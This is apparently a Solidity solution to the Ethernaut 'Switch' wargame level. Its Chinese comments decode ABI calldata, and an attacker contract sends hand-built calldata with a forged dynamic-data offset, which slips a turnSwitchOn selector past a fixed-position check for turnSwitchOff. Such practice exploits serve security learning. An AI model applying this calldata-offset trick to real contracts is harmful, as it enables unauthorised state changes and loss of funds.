// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Switch} from "../../src/ethernaut/29_Switch/Switch.sol";

contract Switch_Attacker {
	address player;
	Switch coreInst;
	
	constructor(Switch coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 当调用：contract.flipSwitch(hex"12345678abcd")
		// 此时，calldata如下：
		// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000612345678abcd0000000000000000000000000000000000000000000000000000
		
		// 下面开始分解它：
		// 30c13ade ---> Keccak25("flipSwitch(bytes)") 30c13adec91872243f797e6f9ca682ad108854e1f771ca6bee08c6550c7198d7
		// 0000000000000000000000000000000000000000000000000000000000000020 ---> 函数参数 _data 是动态数据类型，为了表示其真实位置，则必须加入偏移值。从 calldata 起始位置 + 32个字节(0x20)，因为"刨除掉头部的函数选择器字节码，再偏移32个字节，才能看到参数部分(长度+内容)"
		// 0000000000000000000000000000000000000000000000000000000000000006 ---> 函数参数 _data 的长度是 6 字节，十六进制表示 0x6
		// 12345678abcd0000000000000000000000000000000000000000000000000000 ---> 函数参数 _data 的原始内容，它是字节数组，所以，按照原始顺序摆放。
		
		// 所以，此时需要把参数部分，置换为`bytes4(keccak256("turnSwitchOff()"))`
		// 由于`目标字节数据是4个字节`，默认为左侧补充0，这时就不符合`calldatacopy(selector, 68, 4)`
		// 故，需要让内容全部移动到左侧。
		// 最简单的方式是：bytes32(Switch.turnSwitchOff.selector)
		
		// 0x20606e1500000000000000000000000000000000000000000000000000000000
		// 此时，使用 paddedData_Right 的结构，是可以通过 修饰器onlyOff 的。
		// 但是，却指向的使用 函数 turnSwitchOff，不是函数 turnSwitchOn
		// 而
		// Keccak25("turnSwitchOff()") 20606e15b70f0894e0e83ae9593ae406a94abb5adcfcf0d169c6784f02198dc3
		// Keccak25("turnSwitchOn()") 76227e12b0f9524a1cdf8423a63057ea998f18f618846d452f0caf8339009449
		// 此时，似乎无解了。
		
		// switchContract.flipSwitch(paddedData_OffRight);
		
		bytes memory leftPaddedData_On = abi.encodePacked(
			bytes28(0),
			bytes4(keccak256("turnSwitchOn()"))
		);
		bytes memory rightPaddedData_On = abi.encodePacked(
			bytes4(keccak256("turnSwitchOn()")),
			bytes28(0)
		);
		// Switch.turnSwitchOn.selector
		
		bytes memory mixedBytes = bytes.concat(
			Switch.flipSwitch.selector,
			bytes32(uint256(0x60)),
			bytes32(0),
			bytes32(Switch.turnSwitchOff.selector),
			bytes32(uint256(0x04)),
			Switch.turnSwitchOn.selector
		);
		
		// 最终，在 flipSwitch函数内，得到的 calldata 如下：
		// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e12
		// 拆分如下：
		// 30c13ade ---> Keccak25("flipSwitch(bytes)") 30c13adec91872243f797e6f9ca682ad108854e1f771ca6bee08c6550c7198d7
		// 0000000000000000000000000000000000000000000000000000000000000060 ---> 函数参数 _data 是动态数据类型，为了表示其真实位置，则必须加入偏移值(但是，允许自定义哦!!!!)。强行自定义 -> 从 calldata 起始位置 + 3 * 32个字节(0x60)，因为"刨除掉头部的函数选择器字节码，再偏移3 * 32个字节，才能看到参数部分(长度+内容)"
		// 0000000000000000000000000000000000000000000000000000000000000000 ---> 强行制造空
		// 20606e1500000000000000000000000000000000000000000000000000000000 ---> 强行制造空
		// 0000000000000000000000000000000000000000000000000000000000000004 ---> 函数参数 _data 的长度是 4 字节，十六进制表示 0x4
		// 76227e12                                                         ---> 函数参数 _data 的原始内容，它是字节数组，所以，按照原始顺序摆放。
		
		address(coreInst).call(mixedBytes);
	}
}
